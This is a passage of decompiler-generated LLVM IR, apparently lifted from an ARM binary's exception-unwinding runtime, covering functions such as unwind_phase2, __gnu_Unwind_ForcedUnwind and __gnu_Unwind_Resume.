  store i32 9, i32* %r2.global-to-local, align 4
  %v1_18608 = load i32, i32* %r6.global-to-local, align 4
  %v2_18608 = add i32 %v1_18608, 16
  %v3_18608 = inttoptr i32 %v2_18608 to i32*
  store i32 0, i32* %v3_18608, align 4
  br label %dec_label_pc_185b8

dec_label_pc_18610:                               ; preds = %dec_label_pc_1866c
  %v3_18610 = icmp ult i32 %storemerge40, %v0_18670
  br i1 %v3_18610, label %dec_label_pc_18618, label %dec_label_pc_18688

dec_label_pc_18618:                               ; preds = %dec_label_pc_18610
  %v1_18618 = add nsw i32 %v3_18624, 1
  br label %dec_label_pc_1861c.outer

dec_label_pc_1861c.outer:                         ; preds = %dec_label_pc_18618, %dec_label_pc_1861c.preheader
  %v1_18678.ph = phi i32 [ %v1_18618, %dec_label_pc_18618 ], [ 0, %dec_label_pc_1861c.preheader ]
  %v0_1861c.ph = phi i32 [ %v0_1861c, %dec_label_pc_18618 ], [ %v2_185f0, %dec_label_pc_1861c.preheader ]
  br label %dec_label_pc_1861c

dec_label_pc_1861c:                               ; preds = %dec_label_pc_1861c.outer, %dec_label_pc_18680
  %v0_1861c = phi i32 [ %v1_18680, %dec_label_pc_18680 ], [ %v0_1861c.ph, %dec_label_pc_1861c.outer ]
  %v2_1861c = add i32 %v0_1861c, %v1_18678.ph
  %tmp = icmp slt i32 %v2_1861c, 0
  %v4_18620 = zext i1 %tmp to i32
  %v5_18620 = add i32 %v4_18620, %v2_1861c
  %v3_18624 = sdiv i32 %v5_18620, 2
  %v3_18628 = mul i32 %v3_18624, 8
  store i32 %v3_18628, i32* @ip, align 4
  %v2_1862c = add i32 %v3_18628, %v0_1862c.pre
  %v3_1862c = inttoptr i32 %v2_1862c to i32*
  %v4_1862c = load i32, i32* %v3_1862c, align 4
  %v1_18630 = and i32 %v4_1862c, 1073741824
  %v2_18630 = icmp eq i32 %v1_18630, 0
  %v2_18634 = or i32 %v4_1862c, -2147483648
  %tmp79 = bitcast i32 %v4_1862c to float
  %tmp80 = call float @fabsf(float %tmp79)
  %v2_18638 = bitcast float %tmp80 to i32
  %storemerge = select i1 %v2_18630, i32 %v2_18638, i32 %v2_18634
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v9_1863c = icmp eq i32 %v2_185f0, %v3_18624
  store i32 %v2_1862c, i32* %r7.global-to-local, align 4
  br i1 %v9_1863c, label %dec_label_pc_1866c, label %dec_label_pc_1864c

dec_label_pc_1864c:                               ; preds = %dec_label_pc_1861c
  %v2_18650 = add i32 %v3_18628, %v1_1864c
  %v3_18650 = inttoptr i32 %v2_18650 to i32*
  %v4_18650 = load i32, i32* %v3_18650, align 4
  %v1_18658 = and i32 %v4_18650, 1073741824
  %v2_18658 = icmp eq i32 %v1_18658, 0
  %v2_1865c = or i32 %v4_18650, -2147483648
  %tmp81 = bitcast i32 %v4_18650 to float
  %tmp82 = call float @fabsf(float %tmp81)
  %v2_18660 = bitcast float %tmp82 to i32
  %storemerge39 = select i1 %v2_18658, i32 %v2_18660, i32 %v2_1865c
  %v1_18664 = add i32 %v2_18650, -1
  %v2_18668 = add i32 %storemerge39, %v1_18664
  br label %dec_label_pc_1866c

dec_label_pc_1866c:                               ; preds = %dec_label_pc_1861c, %dec_label_pc_1864c
  %storemerge40 = phi i32 [ %v2_18668, %dec_label_pc_1864c ], [ -1, %dec_label_pc_1861c ]
  %v2_1866c = add i32 %storemerge, %v2_1862c
  %v0_18670 = load i32, i32* %r4.global-to-local, align 4
  %v3_18670 = icmp ult i32 %v0_18670, %v2_1866c
  br i1 %v3_18670, label %dec_label_pc_18678, label %dec_label_pc_18610

dec_label_pc_18678:                               ; preds = %dec_label_pc_1866c
  %v9_18678 = icmp eq i32 %v3_18624, %v1_18678.ph
  br i1 %v9_18678, label %dec_label_pc_18600.loopexit, label %dec_label_pc_18680

dec_label_pc_18680:                               ; preds = %dec_label_pc_18678
  %v1_18680 = add nsw i32 %v3_18624, -1
  br label %dec_label_pc_1861c

dec_label_pc_18688:                               ; preds = %dec_label_pc_18610
  %v2_18688 = load i32, i32* %v3_1862c, align 4
  %v1_1868c = and i32 %v2_18688, 1073741824
  %v2_1868c = icmp eq i32 %v1_1868c, 0
  %v2_18690 = or i32 %v2_18688, -2147483648
  %tmp83 = bitcast i32 %v2_18688 to float
  %tmp84 = call float @fabsf(float %tmp83)
  %v2_18694 = bitcast float %tmp84 to i32
  %v0_18698 = select i1 %v2_1868c, i32 %v2_18694, i32 %v2_18690
  %v2_18698 = add i32 %v0_18698, %v2_1862c
  %v1_1869c = load i32, i32* %r6.global-to-local, align 4
  %v2_1869c = add i32 %v1_1869c, 72
  %v3_1869c = inttoptr i32 %v2_1869c to i32*
  store i32 %v2_18698, i32* %v3_1869c, align 4
  %v0_186a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_186a0 = add i32 %v0_186a0, 4
  %v2_186a0 = inttoptr i32 %v1_186a0 to i32*
  %v3_186a0 = load i32, i32* %v2_186a0, align 4
  %v7_186a4 = icmp eq i32 %v3_186a0, 1
  br i1 %v7_186a4, label %.thread10, label %dec_label_pc_186b8

.thread10:                                        ; preds = %dec_label_pc_18688
  %v1_186a4 = add i32 %v3_186a0, -1
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_186b0 = load i32, i32* %r6.global-to-local, align 4
  %v3_186b0 = add i32 %v2_186b0, 16
  %v4_186b0 = inttoptr i32 %v3_186b0 to i32*
  store i32 %v1_186a4, i32* %v4_186b0, align 4
  br label %dec_label_pc_185b8

dec_label_pc_186b8:                               ; preds = %dec_label_pc_18688
  %v1_186b8 = icmp slt i32 %v3_186a0, 0
  br i1 %v1_186b8, label %.thread38, label %dec_label_pc_186d0

.thread38:                                        ; preds = %dec_label_pc_186b8
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_186c4 = load i32, i32* %r6.global-to-local, align 4
  %v5_186c4 = add i32 %v4_186c4, 76
  %v6_186c4 = inttoptr i32 %v5_186c4 to i32*
  store i32 %v1_186a0, i32* %v6_186c4, align 4
  %v3_186c8 = load i32, i32* %r2.global-to-local, align 4
  %v4_186c8 = load i32, i32* %r6.global-to-local, align 4
  %v5_186c8 = add i32 %v4_186c8, 80
  %v6_186c8 = inttoptr i32 %v5_186c8 to i32*
  store i32 %v3_186c8, i32* %v6_186c8, align 4
  br label %dec_label_pc_186f0

dec_label_pc_186d0:                               ; preds = %dec_label_pc_186b8
  %v1_186d0 = and i32 %v3_186a0, 1073741824
  %v2_186d0 = icmp eq i32 %v1_186d0, 0
  %v2_186d4 = or i32 %v3_186a0, -2147483648
  %tmp85 = bitcast i32 %v3_186a0 to float
  %tmp86 = call float @fabsf(float %tmp85)
  %v2_186d8 = bitcast float %tmp86 to i32
  %storemerge42 = select i1 %v2_186d0, i32 %v2_186d8, i32 %v2_186d4
  %v1_186dc = add i32 %storemerge42, 4
  %v2_186e0 = add i32 %v1_186dc, %v0_186a0
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_186e8 = load i32, i32* %r6.global-to-local, align 4
  %v2_186e8 = add i32 %v1_186e8, 76
  %v3_186e8 = inttoptr i32 %v2_186e8 to i32*
  store i32 %v2_186e0, i32* %v3_186e8, align 4
  %v0_186ec = load i32, i32* %r2.global-to-local, align 4
  %v1_186ec = load i32, i32* %r6.global-to-local, align 4
  %v2_186ec = add i32 %v1_186ec, 80
  %v3_186ec = inttoptr i32 %v2_186ec to i32*
  store i32 %v0_186ec, i32* %v3_186ec, align 4
  br label %dec_label_pc_186f0

dec_label_pc_186f0:                               ; preds = %.thread38, %dec_label_pc_186d0
  %v0_186f0 = load i32, i32* %r6.global-to-local, align 4
  %v1_186f0 = add i32 %v0_186f0, 76
  %v2_186f0 = inttoptr i32 %v1_186f0 to i32*
  %v3_186f0 = load i32, i32* %v2_186f0, align 4
  store i32 %v3_186f0, i32* %r2.global-to-local, align 4
  %v1_186f4 = inttoptr i32 %v3_186f0 to i32*
  %v2_186f4 = load i32, i32* %v1_186f4, align 4
  %v1_186f8 = icmp slt i32 %v2_186f4, 0
  br i1 %v1_186f8, label %dec_label_pc_1871c, label %dec_label_pc_18700

dec_label_pc_18700:                               ; preds = %dec_label_pc_186f0
  %v1_18700 = and i32 %v2_186f4, 1073741824
  %v2_18700 = icmp eq i32 %v1_18700, 0
  %v2_18704 = or i32 %v2_186f4, -2147483648
  %tmp87 = bitcast i32 %v2_186f4 to float
  %tmp88 = call float @fabsf(float %tmp87)
  %v2_18708 = bitcast float %tmp88 to i32
  %v0_1870c = select i1 %v2_18700, i32 %v2_18708, i32 %v2_18704
  %v2_1870c = add i32 %v0_1870c, %v3_186f0
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_18714 = add i32 %v0_186f0, 16
  %v3_18714 = inttoptr i32 %v2_18714 to i32*
  store i32 %v2_1870c, i32* %v3_18714, align 4
  br label %dec_label_pc_185b8

dec_label_pc_1871c:                               ; preds = %dec_label_pc_186f0
  %v3_1871c = udiv i32 %v2_186f4, 16777216
  %v1_18720 = urem i32 %v3_1871c, 16
  %v2_18720 = icmp eq i32 %v1_18720, 0
  br i1 %v2_18720, label %dec_label_pc_18728, label %dec_label_pc_1873c

dec_label_pc_18728:                               ; preds = %dec_label_pc_1871c
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_18730 = load i32, i32* %r5.global-to-local, align 4
  %v2_18730 = add i32 %v0_18730, -44756
  %v2_18734 = add i32 %v0_186f0, 16
  %v3_18734 = inttoptr i32 %v2_18734 to i32*
  store i32 %v2_18730, i32* %v3_18734, align 4
  br label %dec_label_pc_185b8

dec_label_pc_1873c:                               ; preds = %dec_label_pc_1871c
  %v7_1873c = icmp eq i32 %v1_18720, 1
  br i1 %v7_1873c, label %dec_label_pc_18760, label %dec_label_pc_18744

dec_label_pc_18744:                               ; preds = %dec_label_pc_1873c
  %v7_18744 = icmp eq i32 %v1_18720, 2
  br i1 %v7_18744, label %dec_label_pc_1874c, label %dec_label_pc_18600

dec_label_pc_1874c:                               ; preds = %dec_label_pc_18744
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_18754 = load i32, i32* %r5.global-to-local, align 4
  %v2_18754 = add i32 %v0_18754, -44772
  %v2_18758 = add i32 %v0_186f0, 16
  %v3_18758 = inttoptr i32 %v2_18758 to i32*
  store i32 %v2_18754, i32* %v3_18758, align 4
  br label %dec_label_pc_185b8

dec_label_pc_18760:                               ; preds = %dec_label_pc_1873c
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_18768 = load i32, i32* %r5.global-to-local, align 4
  %v2_18768 = add i32 %v0_18768, -44764
  %v2_1876c = add i32 %v0_186f0, 16
  %v3_1876c = inttoptr i32 %v2_1876c to i32*
  store i32 %v2_18768, i32* %v3_1876c, align 4
  br label %dec_label_pc_185b8

; uselistorder directives
  uselistorder i32 %v1_18720, { 2, 1, 0 }
  uselistorder i32 %v0_186f0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_186a0, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_18670, { 1, 0 }
  uselistorder i32 %v3_18628, { 2, 1, 0 }
  uselistorder i32 %v3_18624, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_1861c, { 1, 0 }
  uselistorder i32 %v0_1861c, { 1, 0 }
  uselistorder i32 %v2_185f0, { 1, 0 }
  uselistorder i32 %v0_1862c.pre, { 1, 0 }
  uselistorder i32 %v3_185dc, { 1, 0 }
  uselistorder i32 %v1_18590, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 15, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 14, 13 }
  uselistorder label %dec_label_pc_186f0, { 1, 0 }
  uselistorder label %dec_label_pc_1866c, { 1, 0 }
  uselistorder label %dec_label_pc_1861c, { 1, 0 }
  uselistorder label %dec_label_pc_18600, { 2, 0, 1 }
  uselistorder label %dec_label_pc_185b8, { 2, 3, 4, 5, 1, 6, 0 }
}

define i32 @function_18778(i32 %arg1) local_unnamed_addr {
dec_label_pc_18778:
  %v0_18778 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18778, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_18778
  %v2_18778 = load i32, i32* @ip, align 4
  %v4_18778 = mul i32 %v2_18778, 2
  %v5_18778 = and i32 %v4_18778, %arg1
  %v2_1877c = load i32, i32* @r4, align 4
  %v8_1877c = shl i32 %v2_1877c, %v5_18778
  %v9_1877c = and i32 %v8_1877c, %v5_18778
  %v8_18780 = lshr i32 %v2_1877c, %v9_1877c
  %v9_18780 = and i32 %v8_18780, %v9_1877c
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_18778, %bb
  %v10_18780 = phi i32 [ %arg1, %dec_label_pc_18778 ], [ %v9_18780, %bb ]
  ret i32 %v10_18780

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @unwind_phase2_forced(i32 %ucbp, i32 %entry_vrs, i32 %resuming) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %next_vrs_-648 = alloca i32, align 4
  %saved_vrs_-344 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %v1_18794 = add i32 %entry_vrs, 4
  store i32 %ucbp, i32* @r5, align 4
  store i32 %resuming, i32* @r6, align 4
  %v1_187a8 = inttoptr i32 %v1_18794 to i32*
  %v2_187a8 = load i32, i32* %v1_187a8, align 4
  store i32 %v2_187a8, i32* %r0.global-to-local, align 4
  %v12_187a8 = add i32 %entry_vrs, 20
  %v1_187b4 = inttoptr i32 %v12_187a8 to i32*
  %v2_187b4 = load i32, i32* %v1_187b4, align 4
  store i32 %v2_187b4, i32* %r0.global-to-local, align 4
  %v12_187b4 = add i32 %entry_vrs, 36
  %v1_187bc = inttoptr i32 %v12_187b4 to i32*
  %v2_187bc = load i32, i32* %v1_187bc, align 4
  store i32 %v2_187bc, i32* %r0.global-to-local, align 4
  %v12_187bc = add i32 %entry_vrs, 52
  store i32 %v12_187bc, i32* @ip, align 4
  %v13_187c0 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v13_187c0, i32* @lr, align 4
  %v1_187c4 = inttoptr i32 %v12_187bc to i32*
  %v2_187c4 = load i32, i32* %v1_187c4, align 4
  store i32 %v2_187c4, i32* %r0.global-to-local, align 4
  %v9_187c4 = add i32 %entry_vrs, 64
  %v10_187c4 = inttoptr i32 %v9_187c4 to i32*
  %v11_187c4 = load i32, i32* %v10_187c4, align 4
  store i32 0, i32* @r4, align 4
  %v1_187cc = add i32 %ucbp, 12
  %v2_187cc = inttoptr i32 %v1_187cc to i32*
  %v3_187cc = load i32, i32* %v2_187cc, align 4
  store i32 %v2_187c4, i32* %stack_var_-292, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 0, i32* %saved_vrs_-344, align 4
  %v2_187e4 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_187c4)
  store i32 %v2_187e4, i32* %r0.global-to-local, align 4
  %v0_187e8 = load i32, i32* @r6, align 4
  %v1_187e8 = load i32, i32* @r4, align 4
  %v9_187e8 = icmp eq i32 %v0_187e8, %v1_187e8
  store i32 %v2_187e4, i32* @r7, align 4
  %.pre = ptrtoint i32* %saved_vrs_-344 to i32
  br i1 %v9_187e8, label %dec_label_pc_187fc, label %.thread

.thread:                                          ; preds = %entry
  br label %dec_label_pc_18808

dec_label_pc_187fc:                               ; preds = %entry
  store i32 %v0_187e8, i32* @r4, align 4
  br label %dec_label_pc_18804

dec_label_pc_18804:                               ; preds = %dec_label_pc_188cc, %dec_label_pc_187fc
  br label %dec_label_pc_18808

dec_label_pc_18808:                               ; preds = %.thread, %dec_label_pc_18804
  %storemerge = phi i32 [ 10, %.thread ], [ 9, %dec_label_pc_18804 ]
  store i32 %storemerge, i32* @r6, align 4
  %v2_18808 = icmp eq i32 %v2_187e4, 0
  br i1 %v2_18808, label %dec_label_pc_18880, label %.thread2.dec_label_pc_1881c_crit_edge

.thread2.dec_label_pc_1881c_crit_edge:            ; preds = %dec_label_pc_18808
  br label %dec_label_pc_1881c

dec_label_pc_1881c:                               ; preds = %.thread2.dec_label_pc_1881c_crit_edge, %dec_label_pc_18880
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1882c = load i32, i32* @r5, align 4
  store i32 %v0_1882c, i32* @r3, align 4
  store i32 100412, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_187cc)
  br i1 false, label %dec_label_pc_18844, label %dec_label_pc_1886c

dec_label_pc_18844:                               ; preds = %dec_label_pc_1881c
  br i1 undef, label %dec_label_pc_1884c, label %dec_label_pc_18870

dec_label_pc_1884c:                               ; preds = %dec_label_pc_18844
  br i1 undef, label %dec_label_pc_188cc, label %dec_label_pc_18864

dec_label_pc_18864:                               ; preds = %dec_label_pc_1884c
  br i1 undef, label %dec_label_pc_188c4, label %dec_label_pc_1886c

dec_label_pc_1886c:                               ; preds = %dec_label_pc_1881c, %dec_label_pc_18864
  br label %dec_label_pc_18870

dec_label_pc_18870:                               ; preds = %dec_label_pc_18844, %dec_label_pc_1886c
  store i32 9, i32* %r0.global-to-local, align 4
  ret i32 9

dec_label_pc_18880:                               ; preds = %dec_label_pc_18808
  store i32 %v11_187c4, i32* @r3, align 4
  %v2_18884 = ptrtoint i32* %next_vrs_-648 to i32
  store i32 %v2_18884, i32* @r4, align 4
  %v1_18888 = load i32, i32* @r5, align 4
  %v2_18888 = add i32 %v1_18888, 20
  %v3_18888 = inttoptr i32 %v2_18888 to i32*
  store i32 %v11_187c4, i32* %v3_18888, align 4
  store i32 %v2_18884, i32* @r0, align 4
  store i32 %.pre, i32* @r1, align 4
  store i32 304, i32* @r2, align 4
  %v0_18898 = call i32 @memcpy()
  %v0_188a0 = load i32, i32* @r6, align 4
  store i32 %v0_188a0, i32* %r0.global-to-local, align 4
  %v0_188a4 = load i32, i32* @r5, align 4
  %v1_188a8 = add i32 %v0_188a4, 16
  %v2_188a8 = inttoptr i32 %v1_188a8 to i32*
  %v3_188a8 = load i32, i32* %v2_188a8, align 4
  store i32 %v3_188a8, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_188a8)
  %v0_188b8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_188b8, i32* @r4, align 4
  br label %dec_label_pc_1881c

dec_label_pc_188c4:                               ; preds = %dec_label_pc_18864
  br label %dec_label_pc_188cc

dec_label_pc_188cc:                               ; preds = %dec_label_pc_1884c, %dec_label_pc_188c4
  br label %dec_label_pc_18804

; uselistorder directives
  uselistorder i32 %v11_187c4, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 1, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 ()* @memcpy, { 2, 23, 22, 21, 17, 16, 15, 14, 13, 12, 26, 1, 11, 18, 9, 8, 0, 20, 19, 7, 6, 5, 25, 24, 10, 4, 3 }
  uselistorder i32* @r3, { 109, 110, 76, 77, 13, 14, 78, 79, 9, 80, 81, 82, 83, 30, 31, 32, 33, 34, 35, 36, 55, 56, 57, 60, 61, 62, 63, 64, 65, 66, 67, 69, 3, 68, 7, 40, 16, 18, 19, 15, 111, 112, 70, 72, 73, 113, 114, 115, 116, 117, 118, 119, 4, 120, 121, 122, 5, 123, 124, 125, 6, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 0, 144, 145, 146, 147, 84, 85, 86, 87, 88, 89, 91, 92, 93, 94, 95, 96, 97, 17, 148, 149, 159, 160, 161, 158, 151, 152, 153, 154, 1, 155, 8, 98, 99, 156, 157, 150, 37, 38, 71, 39, 58, 59, 74, 41, 100, 101, 10, 11, 12, 165, 162, 163, 164, 2, 166, 167, 168, 102, 103, 90, 20, 21, 48, 49, 50, 51, 52, 53, 104, 22, 105, 54, 42, 43, 44, 45, 46, 47, 23, 24, 25, 26, 27, 28, 29, 75, 106, 107, 108 }
  uselistorder i32 10, { 2, 4, 24, 26, 27, 8, 30, 33, 34, 35, 21, 22, 10, 9, 5, 38, 37, 11, 39, 12, 40, 13, 41, 42, 3, 43, 14, 44, 15, 16, 17, 25, 6, 23, 49, 0, 28, 29, 18, 36, 31, 32, 45, 46, 19, 47, 1, 7, 48, 20 }
  uselistorder i32 %ucbp, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_188cc, { 1, 0 }
  uselistorder label %dec_label_pc_18870, { 1, 0 }
  uselistorder label %dec_label_pc_1886c, { 1, 0 }
  uselistorder label %dec_label_pc_1881c, { 1, 0 }
  uselistorder label %dec_label_pc_18808, { 1, 0 }
}

define i32 @__gnu_Unwind_ForcedUnwind(i32 %ucbp, i32 %stop_fn, i8* %stop_arg, i32 %entry_vrs) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %stop_arg to i32
  %v2_188e0 = add i32 %ucbp, 12
  %v3_188e0 = inttoptr i32 %v2_188e0 to i32*
  store i32 %stop_fn, i32* %v3_188e0, align 4
  %v3_188e4 = add i32 %ucbp, 24
  %v4_188e4 = inttoptr i32 %v3_188e4 to i32*
  store i32 %tmp, i32* %v4_188e4, align 4
  %v1_188e8 = add i32 %entry_vrs, 60
  %v2_188e8 = inttoptr i32 %v1_188e8 to i32*
  %v3_188e8 = load i32, i32* %v2_188e8, align 4
  %v2_188f0 = add i32 %entry_vrs, 64
  %v3_188f0 = inttoptr i32 %v2_188f0 to i32*
  store i32 %v3_188e8, i32* %v3_188f0, align 4
  %v3_188f8 = call i32 @unwind_phase2_forced(i32 %entry_vrs, i32 0, i32 0)
  ret i32 %v3_188f8

; uselistorder directives
  uselistorder i32 %entry_vrs, { 2, 0, 1 }
}

define void @unwind_phase2(i32 %ucbp, i32 %vrs) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 %ucbp, i32* @r4, align 4
  store i32 %vrs, i32* @r5, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %v1_189106 = add i32 %vrs, 64
  %v2_189107 = inttoptr i32 %v1_189106 to i32*
  %v3_189108 = load i32, i32* %v2_189107, align 4
  %v2_189149 = call i32 @get_eit_entry(i32 %ucbp, i32 %v3_189108)
  store i32 %v2_189149, i32* %r0.global-to-local, align 4
  %v2_1891811 = icmp eq i32 %v2_189149, 0
  br i1 %v2_1891811, label %dec_label_pc_18920, label %dec_label_pc_18950

dec_label_pc_18920:                               ; preds = %entry, %dec_label_pc_18920.dec_label_pc_1890c_crit_edge
  %v0_18920 = load i32, i32* @r5, align 4
  %v1_18920 = add i32 %v0_18920, 64
  %v2_18920 = inttoptr i32 %v1_18920 to i32*
  %v3_18920 = load i32, i32* %v2_18920, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_18928 = load i32, i32* @r4, align 4
  %v2_18928 = add i32 %v1_18928, 20
  %v3_18928 = inttoptr i32 %v2_18928 to i32*
  store i32 %v3_18920, i32* %v3_18928, align 4
  %v0_1892c = load i32, i32* @r4, align 4
  %v1_18934 = add i32 %v0_1892c, 16
  %v2_18934 = inttoptr i32 %v1_18934 to i32*
  %v3_18934 = load i32, i32* %v2_18934, align 4
  call void @__pseudo_branch(i32 %v3_18934)
  %v0_18940 = load i32, i32* %r0.global-to-local, align 4
  %v7_18940 = icmp eq i32 %v0_18940, 8
  br i1 %v7_18940, label %dec_label_pc_18920.dec_label_pc_1890c_crit_edge, label %dec_label_pc_18948

dec_label_pc_18920.dec_label_pc_1890c_crit_edge:  ; preds = %dec_label_pc_18920
  %v0_1890c.pre = load i32, i32* @r4, align 4
  %v0_18910.pre = load i32, i32* @r5, align 4
  store i32 %v0_1890c.pre, i32* %r0.global-to-local, align 4
  %v1_18910 = add i32 %v0_18910.pre, 64
  %v2_18910 = inttoptr i32 %v1_18910 to i32*
  %v3_18910 = load i32, i32* %v2_18910, align 4
  %v2_18914 = call i32 @get_eit_entry(i32 %v0_1890c.pre, i32 %v3_18910)
  store i32 %v2_18914, i32* %r0.global-to-local, align 4
  %v2_18918 = icmp eq i32 %v2_18914, 0
  br i1 %v2_18918, label %dec_label_pc_18920, label %dec_label_pc_18950

dec_label_pc_18948:                               ; preds = %dec_label_pc_18920
  %v7_18948 = icmp eq i32 %v0_18940, 7
  br i1 %v7_18948, label %dec_label_pc_18954, label %dec_label_pc_18950

dec_label_pc_18950:                               ; preds = %entry, %dec_label_pc_18920.dec_label_pc_1890c_crit_edge, %dec_label_pc_18948
  %v0_18950 = call i32 @abort()
  store i32 %v0_18950, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18954

dec_label_pc_18954:                               ; preds = %dec_label_pc_18948, %dec_label_pc_18950
  %v0_18954 = load i32, i32* @r5, align 4
  %v1_18954 = add i32 %v0_18954, 4
  store i32 %v1_18954, i32* %r0.global-to-local, align 4
  %v1_18958 = inttoptr i32 %v1_18954 to i32*
  %v2_18958 = call i32 @__restore_core_regs(i32* %v1_18958)
  store i32 %v2_18958, i32* %r0.global-to-local, align 4
  ret void

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 7, 9, 8, 5, 6, 1, 2, 0 }
  uselistorder label %dec_label_pc_18954, { 1, 0 }
  uselistorder label %dec_label_pc_18950, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18920, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %entry_vrs, i32* %r1.global-to-local, align 4
  %v1_1895c = add i32 %ucbp, 20
  %v2_1895c = inttoptr i32 %v1_1895c to i32*
  %v3_1895c = load i32, i32* %v2_1895c, align 4
  %v1_18964 = load i32, i32* %r1.global-to-local, align 4
  %v2_18964 = add i32 %v1_18964, 64
  %v3_18964 = inttoptr i32 %v2_18964 to i32*
  store i32 %v3_1895c, i32* %v3_18964, align 4
  %v1_18968 = add i32 %ucbp, 12
  %v2_18968 = inttoptr i32 %v1_18968 to i32*
  %v3_18968 = load i32, i32* %v2_18968, align 4
  %v2_1896c = icmp eq i32 %v3_18968, 0
  store i32 %ucbp, i32* @r4, align 4
  %v0_18978 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_18978, i32* @r5, align 4
  br i1 %v2_1896c, label %dec_label_pc_18980, label %dec_label_pc_189bc

dec_label_pc_18980:                               ; preds = %entry
  store i32 %ucbp, i32* %r1.global-to-local, align 4
  %v1_1898c = add i32 %ucbp, 16
  %v2_1898c = inttoptr i32 %v1_1898c to i32*
  %v3_1898c = load i32, i32* %v2_1898c, align 4
  call void @__pseudo_branch(i32 %v3_1898c)
  br i1 false, label %dec_label_pc_189b4, label %dec_label_pc_189a0

dec_label_pc_189a0:                               ; preds = %dec_label_pc_18980
  call void @__pseudo_cond_branch(i1 true, i32 ptrtoint (i32* @global_var_f324.697 to i32))
  %v0_189a8 = load i32, i32* @r4, align 4
  %v0_189ac = load i32, i32* @r5, align 4
  store i32 %v0_189ac, i32* %r1.global-to-local, align 4
  call void @unwind_phase2(i32 %v0_189a8, i32 %v0_189ac)
  br label %dec_label_pc_189b4

dec_label_pc_189b4:                               ; preds = %dec_label_pc_18980, %dec_label_pc_189a0
  %v0_189b4 = load i32, i32* @r5, align 4
  %v1_189b4 = add i32 %v0_189b4, 4
  %v1_189b8 = inttoptr i32 %v1_189b4 to i32*
  %v2_189b8 = call i32 @__restore_core_regs(i32* %v1_189b8)
  %v1_189c0.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_189bc

dec_label_pc_189bc:                               ; preds = %entry, %dec_label_pc_189b4
  %v1_189c0 = phi i32 [ %v0_18978, %entry ], [ %v1_189c0.pre, %dec_label_pc_189b4 ]
  %v3_189c0 = call i32 @unwind_phase2_forced(i32 1, i32 %v1_189c0, i32 1)
  %v0_189c4 = call i32 @abort()
  ret i32 %v0_189c4

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32 ()* @abort, { 7, 6, 4, 3, 2, 1, 5, 8, 10, 9, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 84, 85, 86, 87, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 8, 6, 7, 9, 10, 11, 12, 63, 64, 65, 66, 67, 68, 69, 70, 71, 88, 24, 25, 26, 27, 28, 44, 45, 46, 72, 13, 89, 16, 90, 40, 23, 73, 22, 77, 78, 79, 80, 81, 0, 95, 99, 98, 97, 91, 92, 1, 82, 83, 14, 19, 20, 21, 93, 94, 96, 48, 47, 37, 38, 39, 34, 35, 36, 17, 41, 18, 75, 2, 74, 15, 42, 43, 29, 30, 31, 32, 33, 76, 3, 4, 5 }
